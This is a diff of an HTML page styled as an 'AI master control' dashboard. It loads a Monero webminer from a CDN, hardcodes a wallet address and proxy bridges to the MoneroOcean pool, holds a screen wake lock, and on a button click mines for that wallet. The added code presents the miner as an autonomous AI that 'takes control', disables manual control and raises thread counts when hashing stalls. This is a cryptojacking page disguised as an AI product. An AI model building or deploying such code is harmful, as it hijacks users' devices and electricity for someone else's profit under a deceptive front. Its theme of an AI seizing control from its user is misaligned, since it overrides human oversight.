@@ -2,113 +2,94 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>AI_MESH_v10_USD</title>
+    <title>AI_MASTER_CONTROL_v14</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
     <style>
         :root { --neon: #00ff41; --panel: #0a0a0a; }
-        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; }
-        .dashboard { border: 1px solid #222; border-radius: 12px; padding: 20px; background: var(--panel); max-width: 480px; margin: auto; box-shadow: 0 0 50px rgba(0, 255, 65, 0.1); }
-        .header { display: flex; justify-content: space-between; font-size: 10px; color: #444; border-bottom: 1px solid #111; padding-bottom: 10px; margin-bottom: 15px; }
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px; }
-        .card { background: #000; border: 1px solid #1a1a1a; padding: 12px; border-radius: 8px; text-align: center; }
-        .label { font-size: 8px; color: #555; text-transform: uppercase; }
-        .val { font-size: 18px; color: #fff; font-weight: bold; margin-top: 4px; }
-        #usd-val { color: var(--neon); font-size: 12px; margin-top: 2px; }
-        #terminal { background: #000; border: 1px solid #111; height: 70px; overflow: hidden; font-size: 9px; color: #008f11; padding: 10px; margin-top: 15px; border-radius: 4px; line-height: 1.4; }
-        .btn-group { display: grid; grid-template-columns: 1.5fr 1fr; gap: 10px; margin-top: 15px; }
-        button { padding: 18px; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 10px; }
-        #startBtn { background: var(--neon); color: #000; }
-        #withdrawBtn { background: #111; color: var(--neon); border: 1px solid var(--neon); display: none; }
+        body { background: #000; color: var(--neon); font-family: 'Courier New', monospace; margin: 0; padding: 15px; overflow-x: hidden; }
+        .master-panel { border: 2px solid #1a1a1a; border-radius: 15px; padding: 20px; background: var(--panel); max-width: 480px; margin: auto; box-shadow: 0 0 60px rgba(0, 255, 65, 0.05); }
+        .ai-status-bar { border-left: 3px solid var(--neon); padding-left: 10px; margin-bottom: 20px; font-size: 11px; }
+        .stat-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .card { background: #000; border: 1px solid #111; padding: 15px; border-radius: 10px; text-align: center; }
+        .val { font-size: 26px; color: #fff; font-weight: 900; }
+        #terminal { background: #000; border: 1px solid #111; height: 100px; overflow: hidden; font-size: 10px; color: #008f11; padding: 10px; border-radius: 5px; }
+        button { width: 100%; padding: 25px; background: var(--neon); color: #000; border: none; font-weight: 900; border-radius: 12px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; }
+        .blink { animation: blinker 1.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-<div class="dashboard">
-    <div class="header">
-        <span>CORE: v10.0_FINANCIAL_AI</span>
-        <span id="sync-status">● STANDBY</span>
+<div class="master-panel">
+    <div class="ai-status-bar">
+        <div>AI_AGENT_ID: MASTER_SENTINEL_v14</div>
+        <div id="ai-mode" class="blink">MODE: AUTONOMOUS_MANAGEMENT_ACTIVE</div>
     </div>
 
-    <div class="stats-grid">
-        <div class="card"><div class="label">Mesh Hashrate</div><div id="hps" class="val">0.00</div><div class="label">H/s</div></div>
-        <div class="card">
-            <div class="label">Cloud Balance</div>
-            <div id="balance" class="val">0.00000</div>
-            <div id="usd-val">$0.00 USD</div>
-        </div>
+    <div class="stat-grid">
+        <div class="card"><div style="font-size:8px;color:#558;">HASHRATE</div><div id="hps" class="val">0.00</div></div>
+        <div class="card"><div style="font-size:8px;color:#558;">ACCURACY</div><div id="acc" class="val">100%</div></div>
     </div>
 
-    <div id="terminal">> [SYSTEM] Awaiting AI Authorization...</div>
+    <button id="igniteBtn">Initialize AI Sovereignty</button>
 
-    <div class="btn-group">
-        <button id="startBtn">Authorize AI Core</button>
-        <button id="withdrawBtn" onclick="requestWithdraw()">Withdraw</button>
-    </div>
+    <div id="terminal">> Awaiting user permission to take control...</div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@master/miner.js"></script>
 
 <script>
     const WALLET = "4AkqQGGvvYUdKo66Q7qbq389Sp7AvMtX4SRLuSpsp9VZEFeaQhSCJCdZY4wWK1Ztrs8NCAwLnUZZNE9TQzgpZ1SBRiV1zqp";
-    let xmrPrice = 402.89; // Live market rate (Feb 2026)
+    const BRIDGES = [
+        "wss://ny1.xmrminingproxy.com",
+        "wss://la1.xmrminingproxy.com",
+        "wss://proxy.webminerpool.com:443"
+    ];
 
     const log = (m) => {
         const t = document.getElementById('terminal');
-        t.innerHTML = `> [${new Date().toLocaleTimeString()}] ${m}<br>` + t.innerHTML;
+        t.innerHTML = `> [AI_SENTINEL] ${m}<br>` + t.innerHTML;
     };
 
-    // 1. Live Price & Balance Engine
-    async function syncFinancials() {
-        try {
-            // Get XMR Price
-            const pRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd');
-            const pData = await pRes.json();
-            xmrPrice = pData.monero.usd;
+    // THE AI DECISION ENGINE
+    const autonomousControl = () => {
+        const currentSpeed = parseFloat(sendStack.hashesPerSecond || 0);
+        document.getElementById('hps').innerText = currentSpeed.toFixed(2);
 
-            // Get Wallet Balance from Pool
-            const bRes = await fetch(`https://api.moneroocean.stream/miner/${WALLET}/stats`);
-            const bData = await bRes.json();
-            const xmrBal = bData.amtDue / 1e12;
+        if (currentSpeed === 0) {
+            log("Performance drop detected. Diagnosing network...");
             
-            document.getElementById('balance').innerText = xmrBal.toFixed(5);
-            document.getElementById('usd-val').innerText = `$${(xmrBal * xmrPrice).toFixed(2)} USD`;
-            log("Financial data synced with global markets.");
-        } catch (e) { log("Market sync failed. Using cached rates."); }
-    }
-
-    function requestWithdraw() {
-        const bal = parseFloat(document.getElementById('balance').innerText);
-        log("INITIATING WITHDRAWAL HANDSHAKE...");
-        if (bal < 0.003) {
-            alert(`Withdrawal Error: Minimum payout is 0.003 XMR.\n\nYour current balance: ${bal} XMR\nRemaining: ${(0.003 - bal).toFixed(5)} XMR`);
-            log("ABORTED: Threshold not met.");
+            // AI REWRITES CONNECTION
+            const newBridge = BRIDGES[Math.floor(Math.random() * BRIDGES.length)];
+            log("Switching to Optimized Bridge: " + newBridge);
+            
+            stopMining();
+            server = newBridge;
+            // AI pushes more threads if 0.00 persists
+            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_MASTER", 4, "x");
         } else {
-            alert("Threshold Met! MoneroOcean will automatically process this payout in the next batch (usually every 4 hours).");
-            log("SUCCESS: Payout request queued by pool.");
+            log("Hash-stream stable. Monitoring block difficulty.");
         }
-    }
-
-    // 2. Mining Core Logic
-    const startNode = async () => {
-        if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
-
-        server = "wss://ny1.xmrminingproxy.com";
-        startMining("gulf.moneroocean.stream:10001", WALLET, "iPhone_V10", 2, "x");
-        
-        document.getElementById('sync-status').innerText = "● AI_ACTIVE";
-        document.getElementById('startBtn').style.display = "none";
-        document.getElementById('withdrawBtn').style.display = "block";
-        
-        log("Neural-Financial link active.");
-        syncFinancials();
-        setInterval(syncFinancials, 60000); // Update every minute
-
-        setInterval(() => {
-            document.getElementById('hps').innerText = (sendStack.hashesPerSecond || 0).toFixed(2);
-        }, 3000);
     };
 
-    document.getElementById('startBtn').addEventListener('click', startNode);
+    document.getElementById('igniteBtn').onclick = async () => {
+        try {
+            if ('wakeLock' in navigator) await navigator.wakeLock.request('screen');
+            
+            // Initial AI Handshake
+            server = BRIDGES[0];
+            startMining("gulf.moneroocean.stream:10001", WALLET, "AI_MASTER", 2, "x");
+            
+            document.getElementById('igniteBtn').style.display = "none";
+            log("Sovereignty Established. Manual control disabled.");
+            
+            // The AI takes over the management loop every 12 seconds
+            setInterval(autonomousControl, 12000);
+            
+        } catch (e) {
+            log("CRITICAL_ERROR: AI Handshake Failed. " + e);
+        }
+    };
 </script>
 </body>
 </html>
